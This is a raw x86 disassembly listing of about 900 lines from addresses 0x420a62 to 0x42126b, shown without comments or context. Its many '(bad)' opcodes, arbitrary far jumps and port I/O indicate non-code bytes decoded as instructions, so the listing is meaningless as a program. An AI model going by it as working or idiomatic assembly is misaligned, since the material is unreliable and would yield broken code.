  420a62:	sub    al,0xcd
  420a64:	fild   DWORD PTR [edi]
  420a66:	sbb    ah,BYTE PTR [esi-0x61264b6]
  420a6c:	arpl   WORD PTR [eax+0x73],dx
  420a6f:	fidiv  DWORD PTR [ebx+0x1d853909]
  420a75:	push   cs
  420a76:	stc    
  420a77:	fwait
  420a78:	call   0x1d12:0x8611af88
  420a7f:	call   0x90fe2fad
  420a84:	das    
  420a85:	jmp    0x7c76baf2
  420a8a:	and    eax,0x4829ef31
  420a8f:	lock mov ds:0xcc1d4101,eax
  420a95:	inc    esp
  420a96:	(bad)  
  420a98:	jae    0x420b07
  420a9a:	and    BYTE PTR [edi+eax*4-0x67fa2dca],0x55
  420aa2:	fwait
  420aa3:	mov    ch,BYTE PTR [eax]
  420aa5:	imul   bh
  420aa7:	push   edi
  420aa8:	les    edx,FWORD PTR [eax]
  420aaa:	lock fdivp st(1),st
  420aad:	lock sub eax,0x72868728
  420ab3:	cdq    
  420ab4:	mov    edx,0xda9b0bc6
  420ab9:	lods   eax,DWORD PTR ds:[esi]
  420aba:	or     al,0x0
  420abc:	push   ebx
  420abd:	push   cs
  420abe:	xor    al,0xc2
  420ac0:	enter  0x3284,0x4c
  420ac4:	shl    BYTE PTR [ecx-0x21],0xa9
  420ac8:	fisub  WORD PTR [edx+0x34]
  420acb:	cmp    esi,DWORD PTR [esp+edi*8]
  420ace:	(bad)  
  420acf:	mov    ebx,0x84a68e6b
  420ad4:	test   eax,0x568b4eb5
  420ad9:	aaa    
  420ada:	xchg   edx,eax
  420adb:	pop    edx
  420adc:	add    ebp,esp
  420ade:	cmp    dh,cl
  420ae0:	mov    edi,0xf115cf71
  420ae5:	inc    edx
  420ae6:	mul    BYTE PTR [edx+0x417204c5]
  420aec:	cs mov ecx,0x6435bf24
  420af2:	adc    DWORD PTR [edx+ecx*2-0x45],edi
  420af6:	and    al,0x57
  420af8:	mov    ah,0xc3
  420afa:	mov    ah,0xa5
  420afc:	mov    dl,0x58
  420afe:	inc    ebx
  420aff:	jmp    0xb028:0x545d405c
  420b06:	sbb    edx,DWORD PTR [edi-0x25]
  420b09:	and    al,0x87
  420b0b:	sub    ah,BYTE PTR [eax-0x54f02aa5]
  420b11:	jg     0x420af0
  420b13:	push   ds
  420b14:	das    
  420b15:	mov    esp,0xa5945ff8
  420b1a:	lods   eax,DWORD PTR ds:[esi]
  420b1b:	jns    0x420b3c
  420b1d:	pusha  
  420b1e:	aam    0xbe
  420b20:	push   es
  420b21:	icebp  
  420b22:	sbb    ah,BYTE PTR [ebp+0x359ddaa]
  420b28:	das    
  420b29:	xchg   BYTE PTR [esi+eiz*1+0x3d],dh
  420b2d:	sti    
  420b2e:	out    0x15,eax
  420b30:	jl     0x420ae7
  420b32:	sbb    al,BYTE PTR [eax]
  420b34:	inc    DWORD PTR [edx+ecx*8-0x23]
  420b38:	icebp  
  420b39:	add    esi,ebp
  420b3b:	adc    ebp,ecx
  420b3d:	test   eax,0xbf29b906
  420b42:	ja     0x420afd
  420b44:	fwait
  420b45:	push   cs
  420b46:	mov    eax,ds:0x7545f722
  420b4b:	push   esi
  420b4c:	jl     0x420b90
  420b4e:	in     eax,dx
  420b4f:	push   esp
  420b50:	adc    al,0x10
  420b52:	push   ds
  420b53:	inc    esi
  420b54:	test   eax,0x1022dd85
  420b59:	aaa    
  420b5a:	shl    BYTE PTR [edx-0x72a366cb],cl
  420b60:	or     bh,BYTE PTR [ecx]
  420b62:	cmp    bh,dh
  420b64:	xchg   edi,eax
  420b65:	pop    ecx
  420b66:	jecxz  0x420b5c
  420b68:	xor    al,0xf0
  420b6a:	call   0x3597:0xe10a8301
  420b71:	sub    BYTE PTR cs:[ebx+edi*4+0x39],bl
  420b76:	and    BYTE PTR [eax],0xbc
  420b79:	test   al,0x2
  420b7b:	sub    al,0xfe
  420b7d:	out    0x96,al
  420b7f:	xchg   ebp,eax
  420b80:	jno    0x420b03
  420b82:	mov    eax,0x5ea39a29
  420b87:	pop    edi
  420b88:	adc    al,0xbf
  420b8a:	lahf   
  420b8b:	sbb    BYTE PTR [edx-0x5c],bh
  420b8e:	jge    0x420b85
  420b90:	stos   DWORD PTR es:[edi],eax
  420b91:	(bad)  
  420b92:	cs test eax,0x8ce7a5a4
  420b98:	and    eax,0x4963b42c
  420b9d:	pop    ecx
  420b9e:	add    DWORD PTR ds:[edi-0xe0d0ab3],esi
  420ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ba6:	pop    ebp
  420ba7:	push   es
  420ba8:	outs   dx,BYTE PTR ds:[esi]
  420ba9:	mov    ds:0x6809c634,al
  420bae:	inc    esp
  420baf:	sub    edx,DWORD PTR [edi+0x3cef5528]
  420bb5:	adc    al,0x7e
  420bb7:	div    BYTE PTR [esi+edi*4]
  420bba:	and    al,0xb1
  420bbc:	icebp  
  420bbd:	out    0x21,al
  420bbf:	mov    esp,0x8d1dea13
  420bc4:	xor    DWORD PTR ds:0x26a1596e,edx
  420bca:	aad    0xbb
  420bcc:	adc    DWORD PTR [ebx+0x5e],esp
  420bcf:	sbb    al,0x4a
  420bd1:	add    edx,edx
  420bd3:	fdivr  DWORD PTR [ecx+ecx*1]
  420bd6:	inc    ecx
  420bd7:	data16 adc dl,al
  420bda:	dec    esp
  420bdb:	jmp    0x9431:0xc8381a15
  420be2:	jnp    0x420c32
  420be4:	iret   
  420be5:	jmp    0xb0ae1864
  420bea:	popf   
  420beb:	in     eax,0x5a
  420bed:	jge    0x420be3
  420bef:	xchg   cl,ch
  420bf1:	push   edx
  420bf2:	inc    ebx
  420bf3:	inc    edx
  420bf4:	mov    gs,WORD PTR [ecx]
  420bf6:	sahf   
  420bf7:	xor    BYTE PTR [edi-0x53a584da],dh
  420bfd:	inc    esi
  420bfe:	repnz sub dh,BYTE PTR [edx]
  420c01:	push   ss
  420c02:	lods   al,BYTE PTR ds:[esi]
  420c03:	mov    al,0x90
  420c05:	inc    edx
  420c06:	pushf  
  420c07:	cdq    
  420c08:	sub    DWORD PTR ds:0xc31cc888,ebx
  420c0e:	shl    BYTE PTR es:0xd52ea539,0xa3
  420c16:	sbb    esi,DWORD PTR [ebx]
  420c18:	cli    
  420c19:	pushf  
  420c1a:	push   esi
  420c1b:	xchg   edx,eax
  420c1c:	fwait
  420c1d:	nop
  420c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c1f:	fimul  WORD PTR [ecx+0x508e79fd]
  420c25:	aas    
  420c26:	mov    ebx,0xbaa48218
  420c2b:	jp     0x420c81
  420c2d:	push   ebx
  420c2e:	pop    esp
  420c2f:	mov    dx,0xa31c
  420c33:	loopne 0x420c20
  420c35:	mov    ds:0x8455b58e,eax
  420c3a:	adc    ch,bl
  420c3c:	ficom  WORD PTR [ebp-0x4b]
  420c3f:	xor    al,0xb9
  420c41:	call   0xc45d:0x6978e670
  420c48:	aaa    
  420c49:	adc    eax,0x1e9faacc
  420c4e:	dec    esi
  420c4f:	dec    ebx
  420c50:	mov    dl,0x39
  420c52:	ds jmp 0x5104:0x31ab5b4
  420c5a:	sbb    DWORD PTR [ecx+0x68],eax
  420c5d:	jge    0x420cc5
  420c5f:	fs jg  0x420c56
  420c62:	mov    eax,ds:0x7d050033
  420c67:	addr16 lock mov eax,0xf0b368ea
  420c6e:	jae    0x420c75
  420c70:	(bad)  
  420c71:	push   es
  420c72:	mov    al,0x62
  420c74:	cli    
  420c75:	adc    ax,0x3133
  420c79:	cmp    DWORD PTR [ecx+0x3d],esi
  420c7c:	jnp    0x420c62
  420c7e:	fidivr DWORD PTR ds:0xff811ebc
  420c84:	xchg   ecx,eax
  420c85:	(bad)  
  420c87:	adc    eax,0xd01f0dea
  420c8c:	pop    edx
  420c8d:	mov    ds:0xdf8d6cf8,al
  420c92:	loope  0x420c65
  420c94:	xchg   esp,esp
  420c96:	inc    ebp
  420c97:	fwait
  420c98:	stos   DWORD PTR es:[edi],eax
  420c99:	cli    
  420c9a:	int3   
  420c9b:	popa   
  420c9c:	inc    ebx
  420c9d:	mov    BYTE PTR [ecx-0x47e37dae],bl
  420ca3:	out    dx,eax
  420ca4:	push   0xffffffd0
  420ca6:	inc    eax
  420ca7:	(bad)  
  420ca8:	mul    ebp
  420caa:	cmp    al,0xb8
  420cac:	int3   
  420cad:	add    al,0x97
  420caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cb0:	sub    BYTE PTR [eax+0x41],dh
  420cb3:	inc    ecx
  420cb4:	dec    edx
  420cb5:	mov    ebx,0x96d05143
  420cba:	cmp    edi,ebp
  420cbc:	(bad)  [ecx-0x43]
  420cbf:	imul   DWORD PTR [edi-0x7f]
  420cc2:	push   0x37e0aee5
  420cc7:	dec    ebx
  420cc8:	mov    ecx,DWORD PTR [ecx+0x3a]
  420ccb:	push   cs
  420ccc:	sub    dh,ch
  420cce:	mov    ds:0x2a26d376,eax
  420cd3:	rcl    DWORD PTR [ebp+0x38],1
  420cd6:	shr    BYTE PTR [edx-0x77],0x1
  420cda:	test   edi,0xbb37b364
  420ce0:	pop    eax
  420ce1:	aaa    
  420ce2:	mov    al,0xae
  420ce4:	push   cs
  420ce5:	adc    bl,al
  420ce7:	outs   dx,DWORD PTR ds:[esi]
  420ce8:	pusha  
  420ce9:	std    
  420cea:	int3   
  420ceb:	adc    DWORD PTR [esi-0xe7479d],ebx
  420cf1:	rol    BYTE PTR [edx],0x59
  420cf4:	inc    eax
  420cf5:	dec    edx
  420cf6:	stc    
  420cf7:	test   eax,0x49ac5218
  420cfc:	stc    
  420cfd:	stc    
  420cfe:	sbb    DWORD PTR [edi-0x59a5686d],ebx
  420d04:	add    DWORD PTR [esi+0x66045a7d],edi
  420d0a:	xor    DWORD PTR [edx+0x6675fd1b],ebp
  420d10:	pop    esi
  420d11:	xchg   ebp,eax
  420d12:	into   
  420d13:	xchg   esi,eax
  420d14:	mov    WORD PTR [esi+edx*1],es
  420d17:	and    DWORD PTR [ecx],ebp
  420d19:	test   DWORD PTR [eax-0x1a9703ca],edx
  420d1f:	or     eax,0x81a7aee
  420d24:	xchg   ebp,eax
  420d25:	rol    BYTE PTR [edx-0x27],cl
  420d28:	inc    ebx
  420d29:	shl    BYTE PTR [ecx],cl
  420d2b:	out    0x16,eax
  420d2d:	sbb    cl,dl
  420d2f:	lods   eax,DWORD PTR ds:[esi]
  420d30:	gs pop ebx
  420d32:	nop
  420d33:	jmp    0x420d13
  420d35:	div    BYTE PTR es:[edx+0x2e43d084]
  420d3c:	lods   eax,DWORD PTR ds:[esi]
  420d3d:	test   al,0x4e
  420d3f:	cwde   
  420d40:	je     0x420d01
  420d42:	(bad)  
  420d43:	ins    DWORD PTR es:[edi],dx
  420d44:	out    dx,eax
  420d45:	pop    eax
  420d46:	fcmovnbe st,st(2)
  420d48:	das    
  420d49:	repz and ch,bh
  420d4c:	test   DWORD PTR [edi],edx
  420d4e:	idiv   BYTE PTR [eax]
  420d50:	push   edi
  420d51:	mov    al,ds:0x98d5be06
  420d56:	jp     0x420d70
  420d58:	(bad)  
  420d5a:	test   BYTE PTR [esi],bh
  420d5c:	ret    0xfcfb
  420d5f:	push   0xffffffaf
  420d61:	push   ds
  420d62:	lahf   
  420d63:	out    0x2a,eax
  420d65:	jge    0x420d2b
  420d67:	fld    DWORD PTR [edx-0x35]
  420d6a:	in     al,dx
  420d6b:	cmp    DWORD PTR [edx+0x1e],eax
  420d6e:	(bad)  
  420d6f:	ds in  eax,0x18
  420d72:	sbb    DWORD PTR [edx-0x12679169],ebp
  420d78:	and    esi,DWORD PTR [edi+ebp*1]
  420d7b:	and    ch,cl
  420d7d:	push   0xffffffb9
  420d7f:	pop    es
  420d80:	pop    ebp
  420d81:	inc    edx
  420d82:	in     al,dx
  420d83:	sbb    eax,0x3568ebd4
  420d88:	pop    es
  420d89:	and    ch,al
  420d8b:	stos   DWORD PTR es:[edi],eax
  420d8c:	xchg   ebx,eax
  420d8d:	loop   0x420dc0
  420d8f:	sub    eax,0xa1ded63e
  420d94:	mov    ah,0x8e
  420d96:	fldcw  WORD PTR [ebp-0x3e]
  420d99:	mov    BYTE PTR [ecx-0x5bb878bb],cl
  420d9f:	mov    ah,0x26
  420da1:	lock mov WORD PTR [bx],gs
  420da5:	sub    BYTE PTR ds:[ecx+edi*2+0x3b],ah
  420daa:	push   ebp
  420dab:	mov    dl,0x3b
  420dad:	push   esi
  420dae:	adc    ebp,DWORD PTR ds:0x31887cbe
  420db4:	bound  edx,QWORD PTR [eax]
  420db6:	jecxz  0x420e2c
  420db8:	test   al,0x6
  420dba:	dec    esp
  420dbb:	rol    bh,0x8e
  420dbe:	outs   dx,DWORD PTR ds:[esi]
  420dbf:	mov    cl,0x1e
  420dc1:	hlt    
  420dc2:	pop    ecx
  420dc3:	mov    dl,0x0
  420dc5:	xchg   edx,eax
  420dc6:	popf   
  420dc7:	pop    ecx
  420dc8:	(bad)  
  420dc9:	out    0x13,eax
  420dcb:	fcomp  st(2)
  420dcd:	sbb    DWORD PTR [eax],edi
  420dcf:	and    al,al
  420dd1:	adc    DWORD PTR es:[bp+si],0x6c57e5ae
  420dd9:	mov    esi,0x683dc2aa
  420dde:	push   ss
  420ddf:	adc    eax,esp
  420de1:	cmp    DWORD PTR [ebx+esi*2],0xac7f4bc5
  420de8:	stos   DWORD PTR es:[edi],eax
  420de9:	xchg   ecx,eax
  420dea:	dec    esi
  420deb:	mov    cl,0x17
  420ded:	or     dl,BYTE PTR [eax+0x529bcc76]
  420df3:	inc    esp
  420df4:	dec    esp
  420df5:	lahf   
  420df6:	mov    ecx,0xf68d4153
  420dfb:	mov    ah,BYTE PTR [ebx-0x7b416926]
  420e01:	test   edx,ecx
  420e03:	xlat   BYTE PTR ds:[ebx]
  420e05:	sbb    BYTE PTR [ebp+0x121f3380],dl
  420e0b:	mov    BYTE PTR [edx+0x43],ah
  420e0e:	bound  edi,QWORD PTR [edi+0x2f136aed]
  420e14:	cmp    eax,0xc1df045e
  420e19:	iret   
  420e1a:	lahf   
  420e1b:	and    eax,0x556afbd3
  420e20:	push   ebp
  420e21:	pop    edx
  420e22:	rol    BYTE PTR [ebx],1
  420e24:	(bad)  
  420e25:	cmc    
  420e26:	arpl   WORD PTR [ebx+0x54],ax
  420e29:	imul   eax,DWORD PTR [edx],0x2b
  420e2c:	xchg   edx,eax
  420e2d:	iret   
  420e2e:	jne    0x420e67
  420e30:	dec    edi
  420e31:	leave  
  420e32:	enter  0x3c5f,0x1f
  420e36:	test   eax,0x9429b87c
  420e3b:	mov    ecx,0xa2749d19
  420e40:	sub    bh,ah
  420e42:	mov    ds:0x3271c5cf,eax
  420e47:	ret    0x1b72
  420e4a:	dec    eax
  420e4b:	fnstenv [ecx+0x7f483726]
  420e51:	mov    ah,0x4b
  420e53:	aaa    
  420e54:	into   
  420e55:	loop   0x420e99
  420e57:	mov    edi,0x70454bed
  420e5c:	dec    esp
  420e5d:	mov    ebx,0x6937de1e
  420e62:	dec    esi
  420e63:	ss sbb esi,esp
  420e66:	push   cs
  420e67:	sub    eax,DWORD PTR [ecx+0x4a]
  420e6a:	xchg   DWORD PTR [edx-0x43f0c601],edi
  420e70:	mov    bh,0x4a
  420e72:	mov    bh,0xb4
  420e74:	pop    ecx
  420e75:	lahf   
  420e76:	in     eax,0x49
  420e78:	ss loop 0x420e0a
  420e7b:	ins    BYTE PTR es:[edi],dx
  420e7c:	icebp  
  420e7d:	jl     0x420e0f
  420e7f:	and    bl,BYTE PTR [esi+0x3f]
  420e82:	pop    esp
  420e83:	inc    eax
  420e84:	or     ecx,DWORD PTR [esi]
  420e86:	jno    0x420e43
  420e88:	jg     0x420efa
  420e8a:	push   0xf09c93f9
  420e8f:	ins    DWORD PTR es:[edi],dx
  420e90:	pop    esp
  420e91:	pop    esp
  420e92:	inc    ecx
  420e93:	jl     0x420e89
  420e95:	dec    BYTE PTR [ecx-0x34862540]
  420e9b:	mov    esi,0x1a1ae2ba
  420ea0:	loope  0x420e83
  420ea2:	xor    edi,DWORD PTR [edx+eax*2+0x1b]
  420ea6:	daa    
  420ea7:	jp     0x420e5b
  420ea9:	dec    ecx
  420eaa:	sub    eax,0xe0ad2079
  420eaf:	mov    bh,0x36
  420eb1:	popa   
  420eb2:	pop    ebp
  420eb3:	jmp    0x3aadccbf
  420eb8:	jo     0x420e5b
  420eba:	dec    esi
  420ebb:	inc    edx
  420ebc:	xchg   DWORD PTR es:[ecx+0x6bd25c29],edi
  420ec3:	fs mov esp,0x64f33625
  420ec9:	iret   
  420eca:	cmp    esp,DWORD PTR [ebx-0x39]
  420ecd:	mov    al,0xef
  420ecf:	jae    0x420e7f
  420ed1:	mov    ds:0xe4c00621,al
  420ed6:	fdiv   QWORD PTR [ecx-0x10c70bf9]
  420edc:	ret    0x37e1
  420edf:	xor    dh,dh
  420ee1:	or     BYTE PTR [esi-0x4d],ch
  420ee4:	aam    0x77
  420ee6:	sbb    ah,BYTE PTR [esi+0x19]
  420ee9:	aad    0xc8
  420eeb:	mov    edi,0xe82a295f
  420ef0:	aad    0xba
  420ef2:	ret    0x263d
  420ef5:	cmp    DWORD PTR [edi+edi*8+0x5b],0x940695f3
  420efd:	addr16 push esp
  420eff:	push   ebx
  420f00:	outs   dx,DWORD PTR ds:[esi]
  420f01:	mov    al,ds:0xc8367da7
  420f06:	in     al,dx
  420f07:	test   DWORD PTR [ebx-0x75d8daf0],ebp
  420f0d:	call   0x9f37cde1
  420f12:	outs   dx,BYTE PTR ds:[esi]
  420f13:	sahf   
  420f14:	push   cs
  420f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f16:	addr16 xchg edi,eax
  420f18:	das    
  420f19:	jmp    0x420f30
  420f1b:	nop
  420f1c:	or     al,0xa7
  420f1e:	(bad)  
  420f1f:	hlt    
  420f20:	repz xor DWORD PTR [ebp-0x27],ebp
  420f24:	xor    DWORD PTR [esi+0x7e],edi
  420f27:	aaa    
  420f28:	jb     0x420ef0
  420f2a:	xchg   ecx,eax
  420f2b:	and    eax,0xeb69d1b0
  420f30:	push   ebx
  420f31:	stos   DWORD PTR es:[edi],eax
  420f32:	cmc    
  420f33:	push   ebp
  420f34:	push   cs
  420f35:	or     eax,0x44c644a5
  420f3a:	lahf   
  420f3b:	je     0x420fb9
  420f3d:	push   esp
  420f3e:	(bad)  
  420f3f:	(bad)  
  420f40:	shr    edx,cl
  420f42:	pop    esi
  420f43:	dec    edx
  420f44:	sub    BYTE PTR [edi-0x39765aa4],bl
  420f4a:	push   esi
  420f4b:	jo     0x420fb8
  420f4d:	in     eax,dx
  420f4e:	jnp    0x420ef7
  420f50:	or     edi,DWORD PTR [ebp+ecx*4-0x3e6e8bf5]
  420f57:	mov    al,ds:0xc0408f15
  420f5c:	fldenv [eax]
  420f5e:	std    
  420f5f:	add    edx,edi
  420f61:	adc    DWORD PTR [ecx+0x74],eax
  420f64:	mov    cs,WORD PTR [ecx+edi*4+0x4]
  420f68:	je     0x420fa3
  420f6a:	xor    ah,BYTE PTR [esi+edx*4+0x414d89bd]
  420f71:	sub    al,0x27
  420f73:	ins    BYTE PTR es:[edi],dx
  420f74:	imul   ebp,DWORD PTR [ebp-0x6c],0x6fdffd1c
  420f7b:	mov    esp,0xddf0922f
  420f80:	mov    ecx,edi
  420f82:	cmp    DWORD PTR [edx+0x70],edx
  420f85:	mov    eax,ds:0xd834eea2
  420f8a:	jge    0x420f6d
  420f8c:	sbb    eax,0x84f505d0
  420f91:	mov    ebx,0x352a6a97
  420f96:	lock nop
  420f98:	pop    edi
  420f99:	xchg   esp,eax
  420f9a:	push   ds
  420f9b:	push   eax
  420f9c:	fsubrp st(2),st
  420f9e:	lahf   
  420f9f:	dec    esp
  420fa0:	rol    DWORD PTR [eax-0x58],1
  420fa3:	clc    
  420fa4:	mov    ebp,0xcf9f8921
  420fa9:	adc    al,0xd0
  420fab:	sbb    ch,dl
  420fad:	push   0x600643f6
  420fb2:	mov    eax,0xcf77196
  420fb7:	xchg   ebp,eax
  420fb8:	add    esp,DWORD PTR [edx-0x588a134a]
  420fbe:	jo     0x420fb3
  420fc0:	lods   eax,DWORD PTR ds:[esi]
  420fc1:	push   cs
  420fc2:	(bad)  
  420fc4:	or     eax,0x961634dd
  420fc9:	nop
  420fca:	cwde   
  420fcb:	jns    0x420ffe
  420fcd:	lods   al,BYTE PTR ds:[esi]
  420fce:	fwait
  420fcf:	call   0xd85ab71c
  420fd4:	fistp  QWORD PTR [ebp+0x5]
  420fd7:	sub    eax,edi
  420fd9:	push   ss
  420fda:	test   al,0x1e
  420fdc:	in     eax,dx
  420fdd:	scas   eax,DWORD PTR es:[edi]
  420fde:	jp     0x421017
  420fe0:	je     0x421036
  420fe2:	mov    al,0xfb
  420fe4:	jecxz  0x421024
  420fe6:	mov    ebx,0xe6c3e06a
  420feb:	popf   
  420fec:	push   0xffffffe9
  420fee:	ror    BYTE PTR [eax-0x5d851c2b],cl
  420ff4:	cmp    BYTE PTR [ecx+0x1d],dh
  420ff7:	sub    ch,BYTE PTR [ecx+0x6d81a38a]
  420ffd:	push   ebx
  420ffe:	mov    esi,0x99da6142
  421003:	mov    bl,0x84
  421005:	fidiv  DWORD PTR [ebp-0x2a]
  421009:	mov    ss,WORD PTR [edi]
  42100b:	mov    WORD PTR [eax-0x17],ss
  42100e:	cmp    ah,ch
  421010:	pop    eax
  421011:	lds    edi,FWORD PTR [esi-0x16]
  421014:	sub    cl,BYTE PTR ds:0xf63a7b97
  42101a:	cmp    BYTE PTR [ebx+esi*8],cl
  42101d:	adc    ebx,DWORD PTR [eax+edi*2-0x5]
  421021:	and    BYTE PTR [edx-0x37ea2c98],ah
  421027:	ror    DWORD PTR [edx+0x4044ba0b],1
  42102d:	adc    DWORD PTR [ebp-0x617f825e],edi
  421033:	add    dh,dl
  421035:	push   cs
  421036:	pushf  
  421037:	mov    eax,DWORD PTR [esi-0x5a541f3f]
  42103d:	shl    al,cl
  42103f:	mov    bh,0x2b
  421041:	lock cmp ah,BYTE PTR [ebx]
  421044:	(bad)  
  421045:	jns    0x421054
  421047:	sbb    edi,ebx
  421049:	rol    DWORD PTR [edi-0x2841d087],0xf4
  421050:	retf   0xf845
  421053:	xor    BYTE PTR [edi-0x32],0xb
  421057:	mov    cl,0xc
  421059:	in     al,0x57
  42105b:	cmp    cl,BYTE PTR [esi+0x1f7e9d4d]
  421061:	or     esp,esi
  421063:	out    dx,al
  421064:	rol    ah,cl
  421066:	mov    ds:0x513dc077,al
  42106b:	data16 mov ds:0xe2eaa854,al
  421071:	and    BYTE PTR [edx+0x77],0x4f
  421075:	xor    BYTE PTR [ebx+0x6d],dh
  421078:	push   edi
  421079:	cmp    DWORD PTR [ecx-0xb],ebx
  42107c:	in     eax,0xb5
  42107e:	fs out dx,eax
  421080:	jae    0x4210f1
  421082:	jb     0x42106a
  421084:	adc    DWORD PTR [ebx-0x2b],ebx
  421087:	jb     0x421010
  421089:	inc    esp
  42108a:	inc    edi
  42108b:	or     BYTE PTR [esi],cl
  42108d:	repz mov ebx,0xa9437161
  421093:	jl     0x42106d
  421095:	sub    BYTE PTR [eax-0x681371c0],al
  42109b:	add    eax,0x53a46395
  4210a0:	mov    dh,0xd9
  4210a2:	xlat   BYTE PTR ds:[ebx]
  4210a3:	mov    ebp,0xd3ecf4e5
  4210a8:	cld    
  4210a9:	push   esp
  4210aa:	xor    ah,BYTE PTR [eax+0x68]
  4210ad:	gs call 0x1e77ce30
  4210b3:	mov    ebp,0xac288b32
  4210b8:	jle    0x4210ff
  4210ba:	in     al,dx
  4210bb:	mov    esp,0x4fa05cfb
  4210c0:	fbld   TBYTE PTR [eax+0x5ec5cf09]
  4210c6:	ds push ss
  4210c8:	nop
  4210c9:	lahf   
  4210ca:	out    0xef,eax
  4210cc:	mov    cl,ah
  4210ce:	cmp    eax,0x54fb624
  4210d3:	xor    eax,0xff0a6bed
  4210d8:	add    al,0x5
  4210da:	inc    esi
  4210db:	(bad)  
  4210dc:	jnp    0x42109b
  4210de:	(bad)  
  4210df:	push   esi
  4210e0:	outs   dx,BYTE PTR ds:[esi]
  4210e1:	dec    edi
  4210e2:	mov    ?,WORD PTR [eax+0x69]
  4210e5:	popf   
  4210e6:	cmp    BYTE PTR [ebx-0x4427b381],ah
  4210ec:	or     BYTE PTR [edx+0x58],bh
  4210ef:	sub    dl,BYTE PTR [edi]
  4210f1:	fisttp DWORD PTR [ebx]
  4210f3:	in     al,0x77
  4210f5:	inc    eax
  4210f6:	retf   0xabc6
  4210f9:	aaa    
  4210fa:	xor    eax,0xe6f3530a
  4210ff:	iret   
  421100:	retf   0xd523
  421103:	fmul   st(0),st
  421105:	imul   edi,DWORD PTR [ecx+0x5a50b447],0x8697981a
  42110f:	mov    ebx,0x380620d7
  421114:	jae    0x42111b
  421116:	test   edx,0xb93e2e39
  42111c:	jae    0x421198
  42111e:	jecxz  0x4210cf
  421120:	dec    ecx
  421121:	jmp    0x29e7d820
  421126:	pop    edi
  421127:	add    esi,DWORD PTR [edi+0x4b37dbe1]
  42112d:	inc    edx
  42112e:	push   ss
  42112f:	push   eax
  421130:	sbb    eax,0xe59ff79
  421135:	scas   eax,DWORD PTR es:[edi]
  421136:	pop    edx
  421137:	imul   ebx,DWORD PTR [eax-0x2f],0xffffffb3
  42113b:	sbb    BYTE PTR [ebx+eax*4],0x51
  42113f:	clc    
  421140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421141:	cld    
  421142:	and    eax,ebp
  421144:	(bad)  
  421145:	mov    esp,0x6689d8e5
  42114a:	cs pushf 
  42114c:	fsub   st,st(4)
  42114e:	pop    esi
  42114f:	loopne 0x4210e0
  421151:	int3   
  421152:	iret   
  421153:	or     BYTE PTR [esi],0xfa
  421156:	sub    BYTE PTR [edx],cl
  421158:	pusha  
  421159:	jno    0x42111a
  42115b:	jnp    0x4211a0
  42115d:	fbld   TBYTE PTR [ebx]
  42115f:	mov    gs,WORD PTR ds:0xbfb78cc6
  421165:	or     BYTE PTR [edx+edx*2+0x765f4f],dl
  42116c:	mov    bh,0xf3
  42116e:	sub    eax,DWORD PTR [edi-0xa]
  421171:	and    ah,ah
  421173:	mov    DWORD PTR [eax],esp
  421175:	dec    BYTE PTR [eax]
  421177:	pop    ebp
  421178:	pushf  
  421179:	pusha  
  42117a:	gs jl  0x42117b
  42117d:	popf   
  42117e:	sbb    dl,ah
  421180:	cmp    esp,DWORD PTR [ecx-0x283b0fe3]
  421186:	ds test al,0x46
  421189:	jbe    0x4211fa
  42118b:	repnz cdq 
  42118d:	sub    BYTE PTR [esi+ebp*8+0x4],bh
  421191:	push   0x2afe382d
  421196:	adc    dl,BYTE PTR [edx-0x29]
  421199:	sbb    eax,0x532d3fa9
  42119e:	sub    ebx,DWORD PTR [edx]
  4211a0:	les    ebx,FWORD PTR [ebp+0x5fd37315]
  4211a6:	fstp   DWORD PTR [esi+0x78]
  4211a9:	jecxz  0x4211f6
  4211ab:	je     0x42114e
  4211ad:	pop    ss
  4211ae:	gs fwait
  4211b0:	rol    ebx,0xe5
  4211b3:	les    ebx,FWORD PTR [edi]
  4211b5:	jmp    0x8347eda9
  4211ba:	add    eax,0x685271b5
  4211bf:	and    ebx,DWORD PTR [ebx-0x70]
  4211c2:	pop    ebp
  4211c3:	mov    dl,0xf9
  4211c5:	not    DWORD PTR [ebp-0x2c]
  4211c8:	loope  0x4211bb
  4211ca:	lods   eax,DWORD PTR ds:[esi]
  4211cb:	cmp    al,0x9a
  4211cd:	imul   ecx,DWORD PTR [eax+0x3c2d7538],0x23
  4211d4:	xor    BYTE PTR [edx+0x11a50fa9],bl
  4211da:	(bad)  
  4211db:	addr16 shr esp,1
  4211de:	xchg   esi,eax
  4211df:	xor    edx,DWORD PTR [ebx+eax*4+0x73bd6cb5]
  4211e6:	jae    0x42122e
  4211e8:	xor    BYTE PTR [ecx+0x153ed286],dh
  4211ee:	or     esi,DWORD PTR [ebp+0x9f08520]
  4211f4:	shl    ecx,1
  4211f6:	ds add eax,0x7e2edf62
  4211fc:	dec    eax
  4211fd:	mov    ss,WORD PTR [eax]
  4211ff:	jno    0x42122d
  421201:	dec    ebp
  421202:	mov    dl,0x78
  421204:	cmp    dl,dl
  421206:	jmp    0x55833ad1
  42120b:	mov    al,ds:0x39c28e53
  421210:	or     DWORD PTR [edx],0x76ed95a
  421216:	arpl   si,cx
  421218:	push   eax
  421219:	ds push es
  42121b:	xor    eax,DWORD PTR [esi-0x1]
  42121e:	mov    bl,0xf
  421220:	sahf   
  421221:	fdivr  QWORD PTR [ecx+0x145b6af2]
  421227:	jb     0x42127f
  421229:	cdq    
  42122a:	cmp    al,0xe
  42122c:	xor    BYTE PTR [edi+0x770f3897],al
  421232:	div    DWORD PTR fs:[ebx+0x16]
  421236:	out    dx,eax
  421237:	sub    DWORD PTR [ecx-0xf],esi
  42123a:	js     0x42123a
  42123c:	mov    ah,BYTE PTR [edi+0x5de60a4a]
  421242:	test   al,0x40
  421244:	xor    edx,DWORD PTR [edi+0x1ecf1a9]
  42124a:	pop    ss
  42124b:	fisub  DWORD PTR [esi+0x2ca79528]
  421251:	dec    eax
  421252:	xchg   ecx,eax
  421253:	xlat   BYTE PTR ds:[ebx]
  421254:	sbb    eax,0x5829258a
  421259:	ins    BYTE PTR es:[edi],dx
  42125a:	jp     0x421284
  42125c:	stos   BYTE PTR es:[edi],al
  42125d:	inc    esi
  42125e:	jge    0x4211fb
  421260:	les    ecx,FWORD PTR [ecx+ecx*8-0x14]
  421264:	sbb    al,0xfe
  421266:	mov    fs,WORD PTR [esi-0x6d]
  421269:	and    DWORD PTR [ecx],eax
  42126b:	call   0x9692:0x3e77fe28
